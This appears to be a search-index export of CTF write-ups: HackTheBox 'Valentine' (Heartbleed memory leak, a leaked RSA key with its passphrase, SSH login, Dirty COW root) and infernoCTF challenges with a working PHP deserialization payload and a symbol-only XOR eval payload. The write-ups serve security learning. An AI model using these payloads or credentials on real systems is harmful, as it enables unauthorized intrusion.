2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP 09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3 -----END RSA PRIVATE KEY----- Nice! We have a private key... but what for? Maybe to login by ssh ? We still need the passphrase for it... I was expecting that dirb helped me with the output, but .. unfortunately, it didn't helped me. There were some php scrips that seemed to encode/decode base64, but nothing else (well, it has the /dev directory): Then, I remembered that there was also an HTTPS server and due to the fact that this image is showing us the logo of hearbleed... maybe we can use the heartbleed exploit to gather information from there? To perform this part I used Metasploit because it already had a module to do it. The usage was pretty straighforward, and after a couple of seconds I had some memory samples: After analzing these samples, I found a very interesting thing. There was an HTTP request there: It was using one the .php scripts that we found thanks to dirb , which was decode.php .. Let's try to decode it: YEAH! seems we have something usefull here. We have an RSA Private key and now we have something that seems to be a passphrase, but..how can we ensure that this is the correct passphrase? In order to ensure it, I issued the following command ssh-keygen -y -f rsa_key.pem with rsa_key.pem being the private RSA key. This command will extract the publick key from the PEM, only if we have the correct passphrase. You, after executing it, and typing the passphrase heartbleedbelievethehype the public key was successfully created. So far we have the PEM and the passphrase for it. My main idea is that this should be used to connect to the server via SSH . But still, we don't know the user. I spent a LOOOONGG time thinking that I wasn't issuing a right command to connect using the PEM, but the problem was not the command but the user. I thought that valentine had to be the correct one. After a couple of hours (yes, hours) I realize that maybe the user wasn't that one... I spent lot of time trying to find the correct user: Looking on new samples of memory gathered by exploiting heartbleed. Looking in the page source code of the pages hosted in the HTTP Server. Trying with common users (guest, www-data, etc). Among others. Finally, two of my neurons did synapsis and I realized that the file where I found the encoded RSA private key, was called hype_key . So I literally ran to type the following command, which fortunately gave me access to the machine. ssh -v -i rsa_key.pem hype@10.10.10.79 Once inside, it was just needed to go to the home directory of this user, and find the user.txt file with the hash inside. Root I copied the LinEnum.sh file to the vm, and made a scan but the path finally wasn't that one. I wanted to know the Kerknel version so figure it out if there was some exploit for it. then I issued the command: uname -a Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux So yeah, the Kernel seemed to be pretty old. I tried with 4 different exploits, two related with the vulnerability on perf_swevent_init and other two related to dity cow . Unfortunately, there didn't work (don't know why, specially the latest). Finally, I found some video explaining how to use a variant of dirty cow to modify the /etc/passwd/ file in order to create a new user with id 0 (root privileges). Exploit The exploit was very straighforwad to use, the only thing I had to change was the value of the salt, for my current user. Afterwards, I was able to run the script. Once it was running, I connected to the system with another shell using the new username and the password that was asked me to set.","title":"Valentine"},{"location":"ctfs/hackthebox/valentine/#valentine-user-root","text":"","title":"Valentine (User &amp; root)"},{"location":"ctfs/hackthebox/valentine/#user","text":"So, in order to start, as always, I used nmap : SSH , HTTP , HTTPS . Let's navigate the web servers while we wait for dirb again. The index of both webservers is an image of a woman like shouting and the logo of heartbleed : From last machine I learn that inside /dev/ something could appear. Let's try...: Well, that was lucky. Inside the notes.txt there isn't anything interesting, but inside hype_key , there is some encoded text. Seems to be printable hex, so let's try to decode it: hex to ascii -----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46 DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R 5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6 0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5 XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ +wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe 2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP 09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3 -----END RSA PRIVATE KEY----- Nice! We have a private key... but what for? Maybe to login by ssh ? We still need the passphrase for it... I was expecting that dirb helped me with the output, but .. unfortunately, it didn't helped me. There were some php scrips that seemed to encode/decode base64, but nothing else (well, it has the /dev directory): Then, I remembered that there was also an HTTPS server and due to the fact that this image is showing us the logo of hearbleed... maybe we can use the heartbleed exploit to gather information from there? To perform this part I used Metasploit because it already had a module to do it. The usage was pretty straighforward, and after a couple of seconds I had some memory samples: After analzing these samples, I found a very interesting thing. There was an HTTP request there: It was using one the .php scripts that we found thanks to dirb , which was decode.php .. Let's try to decode it: YEAH! seems we have something usefull here. We have an RSA Private key and now we have something that seems to be a passphrase, but..how can we ensure that this is the correct passphrase? In order to ensure it, I issued the following command ssh-keygen -y -f rsa_key.pem with rsa_key.pem being the private RSA key. This command will extract the publick key from the PEM, only if we have the correct passphrase. You, after executing it, and typing the passphrase heartbleedbelievethehype the public key was successfully created. So far we have the PEM and the passphrase for it. My main idea is that this should be used to connect to the server via SSH . But still, we don't know the user. I spent a LOOOONGG time thinking that I wasn't issuing a right command to connect using the PEM, but the problem was not the command but the user. I thought that valentine had to be the correct one. After a couple of hours (yes, hours) I realize that maybe the user wasn't that one... I spent lot of time trying to find the correct user: Looking on new samples of memory gathered by exploiting heartbleed. Looking in the page source code of the pages hosted in the HTTP Server. Trying with common users (guest, www-data, etc). Among others. Finally, two of my neurons did synapsis and I realized that the file where I found the encoded RSA private key, was called hype_key . So I literally ran to type the following command, which fortunately gave me access to the machine. ssh -v -i rsa_key.pem hype@10.10.10.79 Once inside, it was just needed to go to the home directory of this user, and find the user.txt file with the hash inside.","title":"User"},{"location":"ctfs/hackthebox/valentine/#root","text":"I copied the LinEnum.sh file to the vm, and made a scan but the path finally wasn't that one. I wanted to know the Kerknel version so figure it out if there was some exploit for it. then I issued the command: uname -a Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux So yeah, the Kernel seemed to be pretty old. I tried with 4 different exploits, two related with the vulnerability on perf_swevent_init and other two related to dity cow . Unfortunately, there didn't work (don't know why, specially the latest). Finally, I found some video explaining how to use a variant of dirty cow to modify the /etc/passwd/ file in order to create a new user with id 0 (root privileges). Exploit The exploit was very straighforwad to use, the only thing I had to change was the value of the salt, for my current user. Afterwards, I was able to run the script. Once it was running, I connected to the system with another shell using the new username and the password that was asked me to set.","title":"Root"},{"location":"ctfs/infernoCTF/dank_php/","text":"Challenge data Name : Dank PHP Category : Web Points : 375 Solution The statement of the challenge was just a link to a page containing the following PHP code: http://104.197.168.32:17010/ <?php include \"flag.php\"; show_source(__FILE__); class user { var $name; var $pass; var $secret; } if (isset($_GET['id'])) { $id = $_GET['id']; $usr = unserialize($id); if ($usr) { $usr->secret = $flag1; if ($usr->name === \"admin\" && $usr->pass === $usr->secret) { echo \"Congratulation! Here is something for you... \" . $usr->pass; if (isset($_GET['caption'])) { $cap = $_GET['caption']; if (strlen($cap) > 45) { die(\"Naaaah, Take rest now\"); } if (preg_match(\"/[A-Za-z0-9]+/\", $cap)) { die(\"Don't mess with the best language!!\"); } eval($cap); // Try to execute echoFlag() } else { echo \"NVM You are not eligible\"; } } else { echo \"Oh no... You can't fool me\"; } } else { echo \"are you trolling?\"; } } else { echo \"Go and watch some Youthoob Tutorials Kidosss!!\"; } > I'm not good a PHP, however I decided to go over it to practice. The flag was divided in two parts, so lets go in order: 1st flag: PHP serialization For this part, we are only going to focus on the following part of the code: <?php include \"flag.php\"; show_source(__FILE__); class user { var $name; var $pass; var $secret; } if (isset($_GET['id'])) { $id = $_GET['id']; $usr = unserialize($id); if ($usr) { $usr->secret = $flag1; if ($usr->name === \"admin\" && $usr->pass === $usr->secret) { echo \"Congratulation! Here is something for you... \" . $usr->pass; In order to get the first part of the flag, we should be able to execute the last line. Therefore, we should met all the previous conditions in order to get there: 1. We need to serialize an object with the format of the class User. 2. We need to send this serialized object thought the id parameter. 3. This object should have the value admin in the name attribute. 4. This object should have the SAME value in the secret and pass attributes. 5. The value of secret and pass must be the value of $flag1 , which is totally unknown for us. To start we need to serialize this object. How serialization works in PHP? No idea. I came across this blog , which explain a little about it. However, the most important resource I got from here was the tool php-cli who let me test my own PHP code :). So now, instead of forging the PHP serialized object manually (first idea), let's let PHP forge it for us :). Once downloaded, I start writing my own code: <?php // Build the same class class user{ var $name; var $pass; var $secret; } // Create the object $user = new User; // Assign values $user->name = \"admin\"; $user->secret = \"ANYTHING\"; // Aliasing! $user->pass = &$user->secret; // Print out the serialized object echo serialize($user); ?> The most important thing from this code was the part of the Aliasing . In order to get the same value as the attribute secret will have (the value of $flag1 ) we needed to define pass as a reference to secret . The output of this code was: O:4:\"user\":3:{s:4:\"name\";s:5:\"admin\";s:4:\"pass\";s:8:\"ANYTHING\";s:6:\"secret\";R:3;} As you can see, after the secret part we have an R , which I think it stands for R eference. If we know send this object via parameter id , we get the first part of the flag: http://104.197.168.32:17010/?id=O:4:\"user\":3:{s:4:\"name\";s:5:\"admin\";s:4:\"pass\";s:8:\"ANYTHING\";s:6:\"secret\";R:3;} <strong>infernoCTF{pHp_1s_</strong> 2nd Flag: non-alphanumeric code Once we are here, we can kind of forget of the previous part and just focus on the following piece of PHP code: if (isset($_GET['caption'])) { $cap = $_GET['caption']; if (strlen($cap) > 45) { die(\"Naaaah, Take rest now\"); } if (preg_match(\"/[A-Za-z0-9]+/\", $cap)) { die(\"Don't mess with the best language!!\"); } eval($cap); // Try to execute echoFlag() } else { echo \"NVM You are not eligible\"; } At first, to solve this, I thought the following possibilities: 1. Bypass the regex. 2. Exploit some vulnerability in preg_match . 3. Execute some code only written with symbols. After some time searching, I found this blog . Which was basically executing PHP code, only using symbols by doing some interesting trick with XOR. However, his trick was using a large amount of chars, and I only had 45 as maximum). Therefore, I built my own payload, using his trick. Let's first explain a little bit about it. The trick Quick and dirty explained, the trick consists on definint a variable as a symbol, and then xoring it with another symbol to get the letter you want. For example, if you XOR the symbols } and < you get a G : <?php $_=\"{\"; $_=($_^\"<\"); echo $_;' > The answer will be G . Therefore, going back to our example, my idea was to use this to build the string echoFlag(); which would be executed later on by the eval . We had to find a combination of symbols that once xored, will write the each of the letter of echoFlag . In order to get that I wrote a tiny and dirty python script: def get_symbols_for(needed_char): symbols = \"!\\\"#$%&\\'()*+,-./:;?@[\\\\]^_`{|}~\" for symbol in symbols: blah = chr(ord(symbol) ^ ord(needed_char)) if blah in symbols: print(\"Symbols {} and {} can be usd for char {}\".format(blah, symbol, needed_char)) return print(\"No symbols found :(\") for char in \"echoFlag\": get_symbols_for(char) Once executed the answer was: Symbols @ and % can be usd for char e Symbols @ and # can be usd for char c Symbols @ and ( can be usd for char h Symbols @ and / can be usd for char o Symbols = and { can be usd for char F Symbols @ and , can be usd for char l Symbols @ and ! can be usd for char a Symbols < and [ can be usd for char g Cool. Now we have which symbols we need to xor to get our string. Let's test locally if this will work: <?php function echoFlag(){ echo \"It has been called!\"; } $cap = '$_=(\"%#(/{,![\"^\"@@@@=@@<\");$_();'; eval($cap); ?> This is the last version, I went trough some intermediate states that I don't thing are relevant . Once executed, the output was: It has been called! . Meaning it worked successfully! Let's send this payload through the cap parameter (don't forget to send the payload of the first part as well!) http://104.197.168.32:17010/?id=O:4:\"user\":3:{s:4:\"name\";s:5:\"admin\";s:4:\"pass\";s:8:\"ANYTHING\";s:6:\"secret\";R:3;}&caption=$_=(\"%#(/{,![\"^\"@@@@=@@<\");$_(); <strong>infernoCTF{pHp_1s_</strong> Buhh! It didn't work. After some time, I figured it out that was because the # wasn't encoded :|. Let's try again: http://104.197.168.32:17010/?id=O:4:\"user\":3:{s:4:\"name\";s:5:\"admin\";s:4:\"pass\";s:8:\"ANYTHING\";s:6:\"secret\";R:3;}&caption=$_=(\"%%23(/{,![\"^\"@@@@=@@<\");$_(); <strong>infernoCTF{pHp_1s_</strong> <br> <strong>a_h34dache} Yess! Here is the second part of the flag: ia_h34dache} And we use only 32 chars instead of the max 45 (;)) Flag infernoCTF{pHp_1s_a_h34dache}","title":"Dank PHP"},{"location":"ctfs/infernoCTF/dank_php/#challenge-data","text":"Name : Dank PHP Category : Web Points : 375","title":"Challenge data"},{"location":"ctfs/infernoCTF/dank_php/#solution","text":"The statement of the challenge was just a link to a page containing the following PHP code: http://104.197.168.32:17010/ <?php include \"flag.php\"; show_source(__FILE__); class user { var $name; var $pass; var $secret; } if (isset($_GET['id'])) { $id = $_GET['id']; $usr = unserialize($id); if ($usr) { $usr->secret = $flag1; if ($usr->name === \"admin\" && $usr->pass === $usr->secret) { echo \"Congratulation! Here is something for you... \" . $usr->pass; if (isset($_GET['caption'])) { $cap = $_GET['caption']; if (strlen($cap) > 45) { die(\"Naaaah, Take rest now\"); } if (preg_match(\"/[A-Za-z0-9]+/\", $cap)) { die(\"Don't mess with the best language!!\"); } eval($cap); // Try to execute echoFlag() } else { echo \"NVM You are not eligible\"; } } else { echo \"Oh no... You can't fool me\"; } } else { echo \"are you trolling?\"; } } else { echo \"Go and watch some Youthoob Tutorials Kidosss!!\"; } > I'm not good a PHP, however I decided to go over it to practice. The flag was divided in two parts, so lets go in order:","title":"Solution"},{"location":"ctfs/infernoCTF/dank_php/#1st-flag-php-serialization","text":"For this part, we are only going to focus on the following part of the code: <?php include \"flag.php\"; show_source(__FILE__); class user { var $name; var $pass; var $secret; } if (isset($_GET['id'])) { $id = $_GET['id']; $usr = unserialize($id); if ($usr) { $usr->secret = $flag1; if ($usr->name === \"admin\" && $usr->pass === $usr->secret) { echo \"Congratulation! Here is something for you... \" . $usr->pass; In order to get the first part of the flag, we should be able to execute the last line. Therefore, we should met all the previous conditions in order to get there: 1. We need to serialize an object with the format of the class User. 2. We need to send this serialized object thought the id parameter. 3. This object should have the value admin in the name attribute. 4. This object should have the SAME value in the secret and pass attributes. 5. The value of secret and pass must be the value of $flag1 , which is totally unknown for us. To start we need to serialize this object. How serialization works in PHP? No idea. I came across this blog , which explain a little about it. However, the most important resource I got from here was the tool php-cli who let me test my own PHP code :). So now, instead of forging the PHP serialized object manually (first idea), let's let PHP forge it for us :). Once downloaded, I start writing my own code: <?php // Build the same class class user{ var $name; var $pass; var $secret; } // Create the object $user = new User; // Assign values $user->name = \"admin\"; $user->secret = \"ANYTHING\"; // Aliasing! $user->pass = &$user->secret; // Print out the serialized object echo serialize($user); ?> The most important thing from this code was the part of the Aliasing . In order to get the same value as the attribute secret will have (the value of $flag1 ) we needed to define pass as a reference to secret . The output of this code was: O:4:\"user\":3:{s:4:\"name\";s:5:\"admin\";s:4:\"pass\";s:8:\"ANYTHING\";s:6:\"secret\";R:3;} As you can see, after the secret part we have an R , which I think it stands for R eference. If we know send this object via parameter id , we get the first part of the flag: http://104.197.168.32:17010/?id=O:4:\"user\":3:{s:4:\"name\";s:5:\"admin\";s:4:\"pass\";s:8:\"ANYTHING\";s:6:\"secret\";R:3;} <strong>infernoCTF{pHp_1s_</strong>","title":"1st flag: PHP serialization"},{"location":"ctfs/infernoCTF/dank_php/#2nd-flag-non-alphanumeric-code","text":"Once we are here, we can kind of forget of the previous part and just focus on the following piece of PHP code: if (isset($_GET['caption'])) { $cap = $_GET['caption']; if (strlen($cap) > 45) { die(\"Naaaah, Take rest now\"); } if (preg_match(\"/[A-Za-z0-9]+/\", $cap)) { die(\"Don't mess with the best language!!\"); } eval($cap); // Try to execute echoFlag() } else { echo \"NVM You are not eligible\"; } At first, to solve this, I thought the following possibilities: 1. Bypass the regex. 2. Exploit some vulnerability in preg_match . 3. Execute some code only written with symbols. After some time searching, I found this blog . Which was basically executing PHP code, only using symbols by doing some interesting trick with XOR. However, his trick was using a large amount of chars, and I only had 45 as maximum). Therefore, I built my own payload, using his trick. Let's first explain a little bit about it.","title":"2nd Flag: non-alphanumeric code"},{"location":"ctfs/infernoCTF/dank_php/#the-trick","text":"Quick and dirty explained, the trick consists on definint a variable as a symbol, and then xoring it with another symbol to get the letter you want. For example, if you XOR the symbols } and < you get a G : <?php $_=\"{\"; $_=($_^\"<\"); echo $_;' > The answer will be G . Therefore, going back to our example, my idea was to use this to build the string echoFlag(); which would be executed later on by the eval . We had to find a combination of symbols that once xored, will write the each of the letter of echoFlag . In order to get that I wrote a tiny and dirty python script: def get_symbols_for(needed_char): symbols = \"!\\\"#$%&\\'()*+,-./:;?@[\\\\]^_`{|}~\" for symbol in symbols: blah = chr(ord(symbol) ^ ord(needed_char)) if blah in symbols: print(\"Symbols {} and {} can be usd for char {}\".format(blah, symbol, needed_char)) return print(\"No symbols found :(\") for char in \"echoFlag\": get_symbols_for(char) Once executed the answer was: Symbols @ and % can be usd for char e Symbols @ and # can be usd for char c Symbols @ and ( can be usd for char h Symbols @ and / can be usd for char o Symbols = and { can be usd for char F Symbols @ and , can be usd for char l Symbols @ and ! can be usd for char a Symbols < and [ can be usd for char g Cool. Now we have which symbols we need to xor to get our string. Let's test locally if this will work: <?php function echoFlag(){ echo \"It has been called!\"; } $cap = '$_=(\"%#(/{,![\"^\"@@@@=@@<\");$_();'; eval($cap); ?> This is the last version, I went trough some intermediate states that I don't thing are relevant . Once executed, the output was: It has been called! . Meaning it worked successfully! Let's send this payload through the cap parameter (don't forget to send the payload of the first part as well!) http://104.197.168.32:17010/?id=O:4:\"user\":3:{s:4:\"name\";s:5:\"admin\";s:4:\"pass\";s:8:\"ANYTHING\";s:6:\"secret\";R:3;}&caption=$_=(\"%#(/{,![\"^\"@@@@=@@<\");$_(); <strong>infernoCTF{pHp_1s_</strong> Buhh! It didn't work. After some time, I figured it out that was because the # wasn't encoded :|. Let's try again: http://104.197.168.32:17010/?id=O:4:\"user\":3:{s:4:\"name\";s:5:\"admin\";s:4:\"pass\";s:8:\"ANYTHING\";s:6:\"secret\";R:3;}&caption=$_=(\"%%23(/{,![\"^\"@@@@=@@<\");$_(); <strong>infernoCTF{pHp_1s_</strong> <br> <strong>a_h34dache} Yess! Here is the second part of the flag: ia_h34dache} And we use only 32 chars instead of the max 45 (;))","title":"The trick"},{"location":"ctfs/infernoCTF/dank_php/#flag","text":"infernoCTF{pHp_1s_a_h34dache}","title":"Flag"},{"location":"ctfs/infernoCTF/really_secure_algorithm/","text":"Challenge data Name : Really Secure Algorithm Again Category : Crypto Points : 170 Solution This challenge had only a file with the following content: e = 65537 N = 25693197123978473 enc_flag = ['0x2135d36aa0c278', '0x3e8f43212dafd7', '0x7a240c1672358', '0x37677cfb281b26', '0x26f90fe5a4bed0', '0xb0e1c482daf4', '0x59c069723a4e4b', '0x8cec977d4159'] Help me find out the secret to decrypt the flag Quickly, we can understand that N (which is the result of P and Q ) is extremelly small. With the dumbest python factorization script, you can factorize it and get the value of both primes. Once factorized: * P = 150758089 * Q = 170426657 (or the other way around, is the same) Once we have the primes, we have all to decrypt the message. I used RsaCtfTool to make things even quicker: python RsaCtfTool.py -p 150758089 -q 170426657 -e 65537 --uncipher 0x2135d36aa0c278 python RsaCtfTool.py -p 150758089 -q 170426657 -e 65537 --uncipher 0x2135d36aa0c278 python RsaCtfTool.py -p 150758089 -q 170426657 -e 65537 --uncipher 0x3e8f43212dafd7 python RsaCtfTool.py -p 150758089 -q 170426657 -e 65537 --uncipher 0x7a240c1672358 python RsaCtfTool.py -p 150758089 -q 170426657 -e 65537 --uncipher 0x37677cfb281b26 python RsaCtfTool.py -p 150758089 -q 170426657 -e 65537 --uncipher 0x26f90fe5a4bed0 python RsaCtfTool.py -p 150758089 -q 170426657 -e 65537 --uncipher 0xb0e1c482daf4 python RsaCtfTool.py -p 150758089 -q 170426657 -e 65537 --uncipher 0x59c069723a4e4b python RsaCtfTool.py -p 150758089 -q 170426657 -e 65537 --uncipher 0x8cec977d4159 Answer was: [+] Clear text : infe [+] Clear text : rnoC [+] Clear text : TF{R [+] Clear text : SA_k [+] Clear text : 3yS_ [+] Clear text : t00_ [+] Clear text : SmAl [+] Clear text : l} Flag infernoCTF{RSA_k3yS_t00_SmAll}","title":"Really Secure Algorithm"},{"location":"ctfs/infernoCTF/really_secure_algorithm/#challenge-data","text":"Name : Really Secure Algorithm Again Category : Crypto Points : 170","title":"Challenge data"},{"location":"ctfs/infernoCTF/really_secure_algorithm/#solution","text":"This challenge had only a file with the following content: e = 65537 N = 25693197123978473 enc_flag = ['0x2135d36aa0c278', '0x3e8f43212dafd7', '0x7a240c1672358', '0x37677cfb281b26', '0x26f90fe5a4bed0', '0xb0e1c482daf4', '0x59c069723a4e4b', '0x8cec977d4159'] Help me find out the secret to decrypt the flag Quickly, we can understand that N (which is the result of P and Q ) is extremelly small. With the dumbest python factorization script, you can factorize it and get the value of both primes. Once factorized: * P = 150758089 * Q = 170426657 (or the other way around, is the same) Once we have the primes, we have all to decrypt the message. I used RsaCtfTool to make things even quicker: python RsaCtfTool.py -p 150758089 -q 170426657 -e 65537 --uncipher 0x2135d36aa0c278 python RsaCtfTool.py -p 150758089 -q 170426657 -e 65537 --uncipher 0x2135d36aa0c278 python RsaCtfTool.py -p 150758089 -q 170426657 -e 65537 --uncipher 0x3e8f43212dafd7 python RsaCtfTool.py -p 150758089 -q 170426657 -e 65537 --uncipher 0x7a240c1672358 python RsaCtfTool.py -p 150758089 -q 170426657 -e 65537 --uncipher 0x37677cfb281b26 python RsaCtfTool.py -p 150758089 -q 170426657 -e 65537 --uncipher 0x26f90fe5a4bed0 python RsaCtfTool.py -p 150758089 -q 170426657 -e 65537 --uncipher 0xb0e1c482daf4 python RsaCtfTool.py -p 150758089 -q 170426657 -e 65537 --uncipher 0x59c069723a4e4b python RsaCtfTool.py -p 150758089 -q 170426657 -e 65537 --uncipher 0x8cec977d4159 Answer was: [+] Clear text : infe [+] Clear text : rnoC [+] Clear text : TF{R [+] Clear text : SA_k [+] Clear text : 3yS_ [+] Clear text : t00_ [+] Clear text : SmAl [+] Clear text : l}","title":"Solution"},{"location":"ctfs/infernoCTF/really_secure_algorithm/#flag","text":"infernoCTF{RSA_k3yS_t00_SmAll}","title":"Flag"},{"location":"ctfs/infernoCTF/register_x/","text":"Challenge data Name : Registering X Category : Misc Points : 300 Solution The challenge only had a file to download, which had the following content: Here's a regex 4 u. Match it if you can... infernoCTF{.(?<=H){21}.[a-z](?<=\\+a){1024}[a-z][a-j](?<!([a-u]|[w-z])(j|[a-h])).{2,64}(?<!\\S){255}n.{2}(?<=\\s)g_fUn\\W(?<=[A-z])}(?<=\\..{14})(?<=^.{33}) Never did a challenge like this, so it was an interesting target. In order to match this regex, I split it in part, otherwise it would have be a mess. I used the following pages to test the regex: 1. https://pythex.org/ 2. https://regex101.com/ 1st part: infernoCTF{.(?<=H){21}.[a-z] Total: infernoCTF{.(?<=H){21}.[a-z] Type: Positive look behind Matching string: infernoCTF{Hzz 2nd part: (?<=+a){1024}[a-z][a-j] Total: infernoCTF{.(?<=H){21}. a-z {1024}[a-z][a-j] Type: Positive look behind Matching string: infernoCTF{H+azj 3rd part: (?<!([a-u]|[w-z])(j|[a-h])).{2,64} Total: infernoCTF{.(?<=H){21}. a-z {1024}[a-z] a-j .{2,64} Type: Negative look behind Matching string: infernoCTF{H+avixx xx can be any thing vi in order to negate both conditions (maybe with one was enough). 4th part: (?<!\\S){255}n.{2} Total: infernoCTF{.(?<=H){21}. a-z {1024}[a-z] a-j .{2,64}(?<!\\S){255}n.{2} Type: Negative look behind Matching string: infernoCTF{H+avixx nxx xx can be anything. 5th part: (?<=\\s)g_fUn\\W Total: infernoCTF{.(?<=H){21}. a-z {1024}[a-z] a-j .{2,64}(?<!\\S){255}n.{2}(?<=\\s)g_fUn\\W Type: Positive look behind Matching string: infernoCTF{H+avixx nx g_fUn! must be a space before g_fUn must end with a non-alphanumeric (/W) 6th part: (?<=[A-z])} Total: infernoCTF{.(?<=H){21}. a-z {1024}[a-z] a-j .{2,64}(?<!\\S){255}n.{2}(?<=\\s)g_fUn\\W(?<=[A-z])} Type: Positive look behind Matching string: infernoCTF{H+avixx nx g_fUn^} [A-z] involves some non alphanumeric character such as: [ / ] ^ _ (check ascii table) At this point, just to make a little more sense, I changed, to spaces : infernoCTF{H+avi n g_fUn^} 7th part: (?<=..{14}) Total: infernoCTF{.(?<=H){21}. a-z {1024}[a-z] a-j .{2,64}(?<!\\S){255}n.{2}(?<=\\s)g_fUn\\W(?<=[A-z])}(?<=..{14}) Type: Positive look behind Matching string: infernoCTF{H+avi . n g_fUn^} Must be a point (14 chars before) and 14 chars.. We can add spaces in the part of {2,64}. 8th part: (?<=^.{33}) Total: infernoCTF{.(?<=H){21}. a-z {1024}[a-z] a-j .{2,64}(?<!\\S){255}n.{2}(?<=\\s)g_fUn\\W(?<=[A-z])}(?<=..{14})(?<=^.{33}) Type: Positive look behind Matching string: infernoCTF{H+avi . n g_fUn^} Total amount of chars should be 33. Remove some spaces. Flag infernoCTF{H+avi . n g_fUn^} Kudos To @NicolasRaus who worked together with me to develop this one.","title":"Register X"},{"location":"ctfs/infernoCTF/register_x/#challenge-data","text":"Name : Registering X Category : Misc Points : 300","title":"Challenge data"},{"location":"ctfs/infernoCTF/register_x/#solution","text":"The challenge only had a file to download, which had the following content: Here's a regex 4 u. Match it if you can... infernoCTF{.(?<=H){21}.[a-z](?<=\\+a){1024}[a-z][a-j](?<!([a-u]|[w-z])(j|[a-h])).{2,64}(?<!\\S){255}n.{2}(?<=\\s)g_fUn\\W(?<=[A-z])}(?<=\\..{14})(?<=^.{33}) Never did a challenge like this, so it was an interesting target. In order to match this regex, I split it in part, otherwise it would have be a mess. I used the following pages to test the regex: 1. https://pythex.org/ 2. https://regex101.com/","title":"Solution"},{"location":"ctfs/infernoCTF/register_x/#1st-part-infernoctfh21a-z","text":"Total: infernoCTF{.(?<=H){21}.[a-z] Type: Positive look behind Matching string: infernoCTF{Hzz","title":"1st part: infernoCTF{.(?&lt;=H){21}.[a-z]"},{"location":"ctfs/infernoCTF/register_x/#2nd-part-a1024a-za-j","text":"Total: infernoCTF{.(?<=H){21}. a-z {1024}[a-z][a-j] Type: Positive look behind Matching string: infernoCTF{H+azj","title":"2nd part: (?&lt;=+a){1024}[a-z][a-j]"},{"location":"ctfs/infernoCTF/register_x/#3rd-part-a-uw-zja-h264","text":"Total: infernoCTF{.(?<=H){21}. a-z {1024}[a-z] a-j .{2,64} Type: Negative look behind Matching string: infernoCTF{H+avixx xx can be any thing vi in order to negate both conditions (maybe with one was enough).","title":"3rd part: 